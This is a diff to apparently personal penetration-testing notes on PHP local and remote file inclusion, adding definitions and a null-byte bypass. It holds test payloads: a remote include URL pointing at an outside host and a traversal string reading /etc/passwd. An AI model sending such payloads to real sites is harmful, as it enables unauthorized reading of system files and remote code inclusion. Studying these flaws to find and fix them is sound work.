@@ -4,6 +4,9 @@ linkedin: https://www.linkedin.com/in/pawe%C5%82-werner-31b40a53/
 
 *************** FILE INCLUDE ***************
 
+LFI - local file inclusion
+RFI - remote file inclusion
+
 File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (require, require_once, include or include_once in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.
 By default, PHP disables loading of remote files, thanks to the configuration option: allow_url_include.
 
@@ -25,3 +28,7 @@ The function used is include().
 3. We can test for Remote File Include, by requesting an external resource: https://xxx.com/. We will see that it gets included inside the current page:
 
 - http://test.com/?page=http://xxx.com
+
+4. Using NULL BYTE (%00) - PHP solved this type of bypass since the version (5.3.4)
+
+http://test.com/?page=../../../../../../../etc/passwd%00
